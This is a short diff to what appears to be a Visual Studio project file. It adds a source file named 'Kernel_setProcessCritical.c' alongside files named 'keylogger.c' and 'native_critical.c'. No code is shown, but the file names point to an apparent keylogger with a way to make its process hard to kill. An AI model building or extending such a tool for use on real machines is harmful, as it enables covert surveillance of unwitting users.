@@ -149,6 +149,7 @@
     <ClCompile Include="initialize.c" />
     <ClCompile Include="Kernel.c" />
     <ClCompile Include="KernelPower.c" />
+    <ClCompile Include="Kernel_setProcessCritical.c" />
     <ClCompile Include="keylogger.c" />
     <ClCompile Include="main.c" />
     <ClCompile Include="native_critical.c" />
